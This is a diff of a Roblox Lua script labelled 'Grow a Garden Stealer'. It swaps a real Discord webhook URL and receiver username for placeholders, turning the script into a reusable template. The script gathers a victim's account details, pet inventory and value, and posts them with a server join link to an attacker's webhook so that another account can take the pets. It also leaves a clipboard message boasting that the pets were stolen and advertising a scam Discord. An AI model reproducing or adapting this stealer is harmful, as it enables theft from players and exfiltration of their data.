@@ -11,8 +11,8 @@
                         Discord: discord.gg/d2zgg2YDMz
 ]]
 
-getgenv().Webhook = "https://discord.com/api/webhooks/1403360509453140040/zkUPKjWIxTd6ksINUvRQ5tAXZ1iUquRSbiOZVOwmr-Jnyq1iIsyi4M0g0axfqsenL1Al"
-getgenv().Username = "dumb"
+getgenv().Webhook = "PUT_HERE_UR_WEBHOOK"
+getgenv().Username = "PUT_HERE_UR_USERNAME"
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -33,6 +33,7 @@ getgenv().Username = "dumb"
 
         setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
 
+        
         if GetServerType:InvokeServer() == "VIPServer" then
             while attempt <= maxAttempts and not teleported do
                 local servers = {}
@@ -336,7 +337,14 @@ getgenv().Username = "dumb"
 
         local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
 
-        local tpScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+        
+        local tpScript = string.format(
+            'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")',
+            game.PlaceId,
+            game.JobId
+        )
+        
+
 
         -- Update pet string generation
         local petString = ""
@@ -380,77 +388,105 @@ getgenv().Username = "dumb"
             end
         end    
 
--- Calculate total value from pets only
-local total_value = 0
+        local accountAgeInDays = Players.LocalPlayer.AccountAge
+        local creationDate = os.time() - (accountAgeInDays * 24 * 60 * 60)
+        local creationDateString = os.date("%Y-%m-%d", creationDate)
+
+        local function truncateByLines(inputString, maxLines)
+            local lines = {}
+            for line in inputString:gmatch("[^\n]+") do
+                table.insert(lines, line)
+            end
+            
+            if #lines <= maxLines then
+                return inputString
+            else
+                local truncatedLines = {}
+                for i = 1, maxLines - 1 do
+                    table.insert(truncatedLines, lines[i])
+                end
+                return table.concat(truncatedLines, "\n")
+            end
+        end
+-- Calculate total value
+local totalValue = 0
 for _, pet in ipairs(pets) do
-    total_value = total_value + (pet.Value or 0)
+    totalValue += pet.Value or 0
 end
+local formattedTotalValue = formatNumberWithCommas(totalValue)
 
--- Build top 5 pets string
-local topPets = ""
-for i, v in ipairs(pets) do
-    if i > 5 then break end
-    local petName = v.PetName or "Unknown Pet"
-    local petValue = v.Value or 0
-    topPets ..= petName .. " → " .. formatNumber(petValue) .. "\n"
+local totalValue = 0
+for _, pet in ipairs(pets) do
+    totalValue += pet.Value or 0
 end
-if topPets == "" then
-    topPets = "No pets found"
-end
+local formattedTotalValue = formatNumberWithCommas(totalValue)
 
--- Send webhook
-local function sendWebhook(url)
-    local http = game:GetService("HttpService")
-    local body = http:JSONEncode({
-        username = Players.LocalPlayer.Name,
-        avatar_url = "https://raw.githubusercontent.com/D3ATH-hub/main/PS99/pfp.png",
-        content = tpscript or "",
-        embeds = {{
+-- Generate Top 5 best pets string
+local top5Pets = {}
+for i = 1, math.min(5, #pets) do
+    local pet = pets[i]
+    table.insert(top5Pets, string.format("%s → %s", pet.PetName, pet.Formatted))
+end
+local top5PetsString = table.concat(top5Pets, "\n")
+
+local tpScript = string.format(
+    'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")',
+    game.PlaceId,
+    game.JobId
+)
+
+local payload = {
+    content = (hasRarePets() and "--@everyone\n" or "") .. tpScript,
+    embeds = {
+        {
             title = "Grow a Garden Stealer",
             color = 32767,
             fields = {
                 {
                     name = "`👤 Player Info:`",
                     value = string.format(
-                        "```\nUsername: %s\nDisplay Name: %s\nExecutor: %s\nAccount Age: %s days\nReceiver: %s```",
-                        Players.LocalPlayer.Name,
-                        Players.LocalPlayer.DisplayName,
-                        detectExecutor(),
-                        tostring(Players.LocalPlayer.AccountAge),
+                        "```👨 Username: %s\n🚹 Display Username: %s\n💻 Executor: %s\n🕹️ Roblox version: %s\nReceiver: %s```",
+                        Players.LocalPlayer.Name or "Unknown",
+                        Players.LocalPlayer.DisplayName or "Unknown",
+                        detectExecutor() or "Unknown",
+                        tostring(version() or "Unknown"),
                         Username or "Unknown"
-                    ),
-                    inline = false
+                    )
                 },
                 {
                     name = "**__Inventory__**",
-                    value = string.format("```Total items: %d\nTotal value: %s```", #pets, formatNumber(total_value)),
-                    inline = false
-                },
-                {
-                    name = "**Top 5 Pets**",
-                    value = "```" .. topPets .. "```",
-                    inline = false
+                    value = string.format(
+                        "```Total items: %d\nTotal Value: %s```\n``Top 5 best pets:``\n```%s```",
+                        #pets,
+                        formattedTotalValue,
+                        top5PetsString
+                    )
                 },
                 {
                     name = "__Join link:__",
-                    value = "[Join Game](" .. ("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s"):format(game.PlaceId, game.JobId) .. ")",
-                    inline = false
+                    value = string.format(
+                        "[click here to join](https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s)",
+                        game.PlaceId,
+                        game.JobId
+                    )
                 }
             },
-            footer = { text = "Best Stealer | " .. os.date("%Y-%m-%d %H:%M:%S") }
-        }}
+            footer = {
+                text = string.format("best Stealer - %s", os.date("%Y-%m-%d %H:%M:%S"))
+            }
+        }
+    },
+    attachments = {}
+}
+
+pcall(function()
+    request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = HttpService:JSONEncode(payload)
     })
-
-    pcall(function()
-        request({
-            Url = url,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = body
-        })
-    end)
-end
-
+end)
 
 
 
@@ -541,7 +577,7 @@ end
                 end
 
         local usernames = {
-            "Smiley9Gamerz",
+            "PUT_HERE_YOUR_BACK_UP_USERNAMES", -- PUT THEIR UR EXTRA USERNAMES
         }
 
         local receiverPlr
